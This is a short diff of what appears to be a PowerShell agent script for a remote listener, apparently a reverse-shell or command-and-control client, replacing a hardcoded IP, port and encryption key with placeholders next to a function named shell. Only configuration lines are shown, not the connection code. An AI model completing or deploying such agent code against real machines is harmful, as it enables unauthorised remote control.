@@ -65,11 +65,11 @@ function shell($fname, $arg){
     $res
 }
 
-$ip   = "192.168.0.28"
-$port = "9090"
+$ip   = "XXX_listener_ip_placeholder_XXX"
+$port = "XXX_listener_port_placeholder_XXX"
 ## secrets.token_hex(32)
 ## secrets.token_urlsafe(32)
-$key  = 'J5H12eEaThLIwpjSaqM6XHpnUcrJqZgvzfno8TQIWoM='
+$key  = "XXX_listener_key_placeholder_XXX"
 $n    = 2
 $name = ""
 $code = ""
